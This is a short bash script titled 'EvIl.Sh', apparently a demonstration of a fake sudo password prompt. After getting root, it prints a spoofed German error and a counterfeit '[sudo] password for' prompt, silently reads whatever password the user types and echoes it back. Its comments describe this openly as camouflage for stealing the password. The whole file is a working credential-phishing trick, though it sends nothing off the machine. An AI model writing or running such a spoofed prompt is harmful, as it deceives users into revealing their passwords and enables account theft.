#!/bin/bash

if [[ $(id -u) != "0" ]]; then
  # store username
  grep "$(id -u)" /etc/passwd | cut -f1 -d: > .usr
  # brag for rights
  echo "EvIl.Sh needs root privileges to run properly."
  exit 1
fi

# bragging worked and we stored the right username
username=$(cat .usr 2>/dev/null|| echo root)

# camoflague, if the user has the password cached we still win because we're root now
echo "Das hat nicht funktioniert, bitte nochmal probieren." # todo use sudo's own translations here
echo "[sudo] password for $username:"

# read in the password
read -sr pass
echo "got your pass: $pass"

exit 137
